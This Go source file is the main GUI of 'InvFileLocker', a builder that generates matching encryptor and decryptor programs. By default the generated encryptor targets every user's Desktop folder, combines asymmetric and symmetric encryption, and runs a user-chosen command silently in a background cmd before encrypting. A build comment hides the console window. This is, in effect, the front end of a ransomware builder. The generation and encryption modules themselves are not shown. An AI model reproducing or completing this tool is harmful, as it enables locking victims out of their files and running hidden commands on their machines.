package main

import (
	"fmt"
	"image/color"
	"strconv"
	"strings"

	fyne "fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

//go build -ldflags "-H=windowsgui" .\main.go .\constVar.go .\random.go .\generate.go .\file.go .\encrypt.go
//go run .\main.go .\constVar.go .\random.go .\generate.go .\file.go .\encrypt.go

func main() {
	a := app.New()
	w := a.NewWindow("InvFileLocker 文件加密")

	header := widget.NewLabel(`
.——————————.——.——.        .————.                .——.                
\—   —————/|——|  |   .——. |    |    .——.   .——. |  | —— .—————————. 
 |    ——)  |  |  | —/ —— \|    |   / —— \ / .——\|  |/ // —— \—  —— \
 |     \   |  |  |—\  ———/|    |——( <  > )  \———|    <\  ———/|  | \/
 \——.  /   |——|————/\——.  >——————. \————/ \———  >——|— \\———  >——|   
     \/                 \/        \/          \/     \/    \/   

InvFileLocker originally ` + VERSION)
	header.TextStyle.Monospace = true

	//加密算法列
	aes_min_input_tips := widget.NewLabel("非对称/对称加密算法临界值：")
	aes_min_input := widget.NewEntry()
	aes_min_input.SetPlaceHolder("文件大小大于该值，使用对称加密算法")
	aes_min_input.SetText("512")
	aes_min_input.Resize(fyne.NewSize(600, 600))
	aes_min_row := container.NewBorder(nil, nil, aes_min_input_tips, widget.NewLabel(" KB"), aes_min_input) //左右中

	//选择路径遍历算法列
	trans_algo_tips := widget.NewLabel("路径遍历算法：")
	trans_algo_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("路径遍历算法", "BFS算法：首先加密文件夹中的第一层文件，然后第二层，第三层...普遍推荐用户使用BFS算法，因为较为重要的文件一般处于文件夹外层\nDFS算法：可以将其简单地理解为逐个文件夹加密，首先加密完文件夹中第一个文件夹的所有文件，然后再加密第二个.", w).Show()
	})
	var trans_algo_bfs_choice *widget.Check
	trans_algo_bfs_choice = widget.NewCheck("BFS算法", func(value bool) {
		trans_algo_bfs_choice.Checked = true
	})
	trans_algo_bfs_choice.Checked = true
	var trans_algo_dfs_choice *widget.Check
	trans_algo_dfs_choice = widget.NewCheck("DFS算法(暂不支持)", func(value bool) {
		trans_algo_dfs_choice.Checked = false
	})
	trans_algo_dfs_choice.Checked = false
	trans_algo_row := container.NewHBox(trans_algo_tips, trans_algo_tips_tips, trans_algo_bfs_choice, trans_algo_dfs_choice)

	//是否开启多线程列
	multi_thread := widget.NewLabel("是否开启多线程同时加密：")
	multi_thread_start_choice := widget.NewCheck("", func(value bool) {})
	multi_thread_start_choice.Checked = false
	multi_thread_row := container.NewHBox(multi_thread, multi_thread_start_choice)

	//命令输入列
	cmd_input_tips := widget.NewLabel("请输入在加密前运行的命令：")
	cmd_input_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("加密前运行的命令", "在加密器运行前，首先会在后台cmd中运行指定命令", w).Show()
	})
	cmd_input := widget.NewEntry()
	cmd_input.SetMinRowsVisible(12)
	cmd_input.SetText("start https://www.bilibili.com/video/BV1GJ411x7h7?verify=true")
	cmd_row := container.NewBorder(nil, nil, container.NewHBox(cmd_input_tips, cmd_input_tips_tips), nil, cmd_input)

	//路径输入列
	path_input_tips := widget.NewLabel("请在下面的输入框中输入要加密的路径，一行一个")
	path_input := widget.NewMultiLineEntry()
	path_input.SetMinRowsVisible(12)
	path_input.SetText("C:\\Users\\*\\Desktop")
	path_row := container.NewVBox(path_input_tips, path_input)

	//错误/正确信息提示列
	error_tips := canvas.NewText("", color.NRGBA{0x80, 0, 0, 0xff})
	error_tips_multiline := widget.NewLabel("")
	error_tips_row := container.NewVBox(error_tips, error_tips_multiline)

	//"生成加密器和解密器" 按钮列
	final_button := widget.NewButton("生成加密器和解密器", func() {
		error_tips.Text = ""
		error_tips_multiline.SetText("")

		aes_min, err := strconv.Atoi(aes_min_input.Text)
		if err != nil || aes_min < 0 {
			error_tips.Text = "*错误：临界值输入错误，请输入正确的正整数值"
			error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
			return
		}
		if aes_min >= 1125899906842624 {
			error_tips.Text = "*错误：临界值输入错误，不得大于 1 PB (1024 ^ 5)"
			return
		}
		paths := strings.Trim(path_input.Text, endl)
		path_slice := strings.Split(paths, endl)

		error_tips_multiline_text := ""
		if len(path_slice) >= 40 {
			error_tips.Text = "*错误：最多只能加密 40 个路径"
			return
		}
		for _, path := range path_slice {
			error_tips_multiline_text += "*获取到路径：" + path + endl
			if len(str_decode2byte(path)) >= 2048 {
				error_tips.Text = "*错误：各路径长度不应大于 2047"
				return
			}
		}

		if len(str_decode2byte(cmd_input.Text)) >= 4096 {
			error_tips.Text = "*错误：CMD 长度不能大于 4095"
			return
		}

		encryptor_path, decryptor_path, _, err := generate(path_slice, aes_min, cmd_input.Text, multi_thread_start_choice.Checked)
		if err != nil {
			error_tips_multiline.SetText(error_tips_multiline_text)
			error_tips.Text += "*生成失败: " + err.Error()
		} else {
			error_tips_multiline.SetText(error_tips_multiline_text)
			error_tips.Text += fmt.Sprintf("*生成成功，加密器路径: %s, 解密器路径: %s", encryptor_path, decryptor_path)
			error_tips.Color = color.NRGBA{0, 0x80, 0, 0xff}
		}
	})

	w.SetContent(container.NewVBox(
		header,
		aes_min_row,
		trans_algo_row,
		multi_thread_row,
		cmd_row,
		path_row,
		final_button,
		error_tips_row,
	))
	w.Resize(fyne.NewSize(600, 600))
	w.ShowAndRun()

}
